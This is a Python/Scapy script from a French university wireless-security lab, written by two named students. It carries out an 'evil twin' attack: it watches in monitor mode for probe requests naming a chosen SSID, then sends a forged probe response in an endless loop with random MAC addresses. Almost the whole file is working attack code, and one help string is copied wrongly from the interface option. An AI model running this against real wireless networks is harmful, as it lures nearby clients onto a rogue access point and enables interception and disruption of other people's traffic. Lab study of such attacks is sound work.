# Laboratoire 2 - Attaque "evil twin", nous attendons un probe request pour un
# SSID donné et nous inondons le réseau avec des probe response avec le SSID
# correspondant
# usage: python3 evilTwin.py -i wlan0mon -s freewifi
#
# Caroline monthoux - Rémi Poulard
from scapy.all import *
import argparse


# Gestion des arguments
parser = argparse.ArgumentParser(prog="Scapy fake channel evil twin attack", usage="python3 evilTwin-py -i wlan0mon -s freewifi", description="Scapy based wifi fake channel attack")
parser.add_argument("-i", "--Interface", required=True, help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-s", "--SSID", required=True, help="The interface that you want to send packets out of, needs to be set to monitor mode")

args = parser.parse_args()

iface = args.Interface

# On regarde que le paquet soit un probe request et qu'il demande le SSID que nous cherchons
def find_ssid_searched(packet):
    if Dot11ProbeReq in packet and packet.info.decode("utf-8") == args.SSID:
        print("SSID cible demandé, envoie de probe response")
        attack(packet)

# Inondation du réseau avec des probe responses
def attack(packet):
    # We create a fake packet with a random MAC
    fakepacket = RadioTap() / Dot11(type=0, subtype=5, addr1=packet.addr2, addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeResp()/Dot11Elt(ID="SSID", info=args.SSID)
    sendp(fakepacket, iface=iface, inter=0.100, loop=1)

print("Attente d'un probe request pour le SSID {ssid}".format(ssid=args.SSID))
sniff(iface=iface, prn=find_ssid_searched)
